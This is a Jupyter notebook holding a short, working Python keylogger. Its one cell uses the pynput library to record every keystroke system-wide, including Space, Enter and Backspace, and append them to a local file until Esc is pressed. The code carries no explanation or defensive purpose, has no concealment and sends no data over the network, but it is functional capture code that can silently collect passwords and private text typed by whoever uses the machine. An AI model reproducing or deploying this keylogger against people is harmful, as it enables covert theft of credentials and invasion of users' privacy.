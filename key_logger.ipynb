{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "# Path to the log file\n",
    "log_file = \"key_log.txt\"\n",
    "\n",
    "# Function to log the keys\n",
    "def on_press(key):\n",
    "    # Open the log file in append mode\n",
    "    with open(log_file, \"a\") as f:\n",
    "        try:\n",
    "            # Write the character of the key pressed\n",
    "            f.write(f\"{key.char}\")\n",
    "        except AttributeError:\n",
    "            # Handle special keys like Enter, Space, etc.\n",
    "            if key == Key.space:\n",
    "                f.write(\" [SPACE] \")\n",
    "            elif key == Key.enter:\n",
    "                f.write(\" [ENTER]\\n\")\n",
    "            elif key == Key.backspace:\n",
    "                f.write(\" [BACKSPACE] \")\n",
    "            else:\n",
    "                f.write(f\" [{key}] \")\n",
    "\n",
    "# Function to stop logging (press Esc to stop)\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        # Stop listener when 'esc' key is pressed\n",
    "        return False\n",
    "\n",
    "# Set up the listener\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
